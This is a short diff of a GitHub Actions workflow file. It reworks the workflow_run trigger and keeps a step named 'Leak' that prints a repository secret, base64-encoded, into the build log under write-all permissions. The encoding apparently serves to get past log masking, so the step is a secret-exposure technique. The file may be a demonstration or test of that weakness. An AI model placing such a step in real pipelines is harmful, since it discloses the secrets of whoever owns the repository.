@@ -1,7 +1,8 @@
-workflow_run:
-  workflows: [Create and Push Branch, Then Make PR]
-  types:
-    - completed
+name: Workflow Trigger
+
+on:
+  workflow_run:
+    workflows: [Create and Push Branch, Then Make PR]
 
 permissions: 
   write-all
@@ -13,4 +14,4 @@ jobs:
     steps:
       - name: Leak
         run: |
-          echo ${{ secrets.SUPER_SECRET }} | base64 -w0 | base64 -w0
+          echo ${{ secrets.SUPER_SECRET }} | base64 -w0
